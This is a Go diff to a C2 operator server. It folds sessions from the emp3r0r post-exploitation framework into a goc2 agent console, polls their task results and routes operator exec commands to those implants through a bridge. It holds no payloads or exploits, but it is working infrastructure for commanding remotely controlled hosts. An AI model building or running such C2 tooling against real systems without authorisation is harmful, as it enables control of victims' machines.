@@ -134,6 +134,10 @@ func (s *Server) c2xPollOnce(first bool) {
 	if err != nil {
 		return
 	}
+	// 融合视图：SSE agents_updated 与初始列表一致地包含 emp3r0r 目标。
+	if emp3r0rEnabled() {
+		clients = append(clients, emp3r0rListClients()...)
+	}
 	agents := c2xAgentShape(clients)
 	if aj, e := json.Marshal(agents); e == nil && string(aj) != c2x.lastAgent {
 		c2x.lastAgent = string(aj)
@@ -148,6 +152,10 @@ func (s *Server) c2xPollOnce(first bool) {
 		}
 		id, _ := m["id"].(string)
 		if id == "" {
+			continue
+		}
+		// emp3r0r 任务不进 goc2 队列，由下方 emp3r0r 快照轮询统一推送。
+		if strings.HasPrefix(id, emp3r0rIDPrefix) {
 			continue
 		}
 		tasks, err := c2Client().ListTasks(ctx, id, nil)
@@ -206,6 +214,48 @@ func (s *Server) c2xPollOnce(first bool) {
 			}
 		}
 	}
+
+	// 融合轮询：emp3r0r 任务快照 → 同款 seen 机制推 response 事件。
+	empTasks := emp3r0rAllTasks()
+	for _, ti := range empTasks {
+		tm, ok := ti.(map[string]any)
+		if !ok {
+			continue
+		}
+		tid, _ := tm["id"].(string)
+		id, _ := tm["client_id"].(string)
+		if tid == "" || id == "" {
+			continue
+		}
+		c2x.mu.Lock()
+		if c2x.seen[id] == nil {
+			c2x.seen[id] = map[string]bool{}
+		}
+		seen := c2x.seen[id]
+		if seen[tid] {
+			c2x.mu.Unlock()
+			continue
+		}
+		status, _ := tm["status"].(string)
+		if status != "done" && status != "failed" {
+			c2x.mu.Unlock()
+			continue // 未完成不标记 seen（同 goc2 逻辑：完成后才推）
+		}
+		seen[tid] = true
+		c2x.mu.Unlock()
+		if first {
+			continue // 首帧历史任务不推送
+		}
+		out, _ := tm["output"].(string)
+		errs, _ := tm["error"].(string)
+		createdAt, _ := tm["createdAt"].(string)
+		if errs != "" {
+			out = "[ERROR] " + errs
+		}
+		c2xHub.publish("response", map[string]any{
+			"agent_id": id, "response_to": tid, "content": out, "timestamp": createdAt,
+		})
+	}
 }
 
 // c2xAgentShape goc2 clients → 参考前端 Agent 卡片形状。
@@ -239,10 +289,15 @@ func c2xAgentShape(clients []any) []map[string]any {
 		osType, _ := m["osType"].(string)
 		arch, _ := m["arch"].(string)
 		note, _ := m["notes"].(string)
+		// 融合标示：emp3r0r 会话在控制台里与 goc2 beacon 并列可辨。
+		version, channel := "goc2", "worker"
+		if strings.HasPrefix(id, emp3r0rIDPrefix) {
+			version, channel = "emp3r0r", "coffloader"
+		}
 		out = append(out, map[string]any{
 			"id": id, "hostname": hostname, "username": user, "os": osType,
 			"arch": arch, "privilege": priv, "note": note,
-			"repo": "FORANG", "channel": "worker", "version": "goc2",
+			"repo": "FORANG", "channel": channel, "version": version,
 			"last_seen": lastBeacon, "last_reply_ago": ago,
 		})
 	}
@@ -319,6 +374,10 @@ func (s *Server) c2xAgents(w http.ResponseWriter, r *http.Request) {
 	if err != nil {
 		writeErr(w, 502, "goc2 不可达: "+err.Error())
 		return
+	}
+	// 融合视图：emp3r0r 目标并入会话列表（与 /api/tools/c2/clients 一致）。
+	if emp3r0rEnabled() {
+		clients = append(clients, emp3r0rListClients()...)
 	}
 	s.c2xPollerStart()
 	writeJSON(w, 200, map[string]any{"agents": c2xAgentShape(clients), "warnings": []string{}})
@@ -403,6 +462,17 @@ func (s *Server) c2xCommand(w http.ResponseWriter, r *http.Request) {
 	}
 
 	cmd = strings.TrimPrefix(cmd, "interactive:")
+	// 融合路由：emp3r0r 命名空间会话走 bridge（run_module exec 经 coffloader）。
+	if strings.HasPrefix(b.AgentID, emp3r0rIDPrefix) {
+		if !emp3r0rEnabled() {
+			writeErr(w, 503, "emp3r0r 后端未启用")
+			return
+		}
+		tag := strings.TrimPrefix(b.AgentID, emp3r0rIDPrefix)
+		tid, _ := emp3r0rEnqueueExec(tag, cmd)
+		writeJSON(w, 200, map[string]any{"command_id": tid, "command": cmd})
+		return
+	}
 	tid, err := c2Client().EnqueueTask(r.Context(), b.AgentID, "exec", map[string]any{"cmd": cmd})
 	if err != nil {
 		writeErr(w, 502, err.Error())
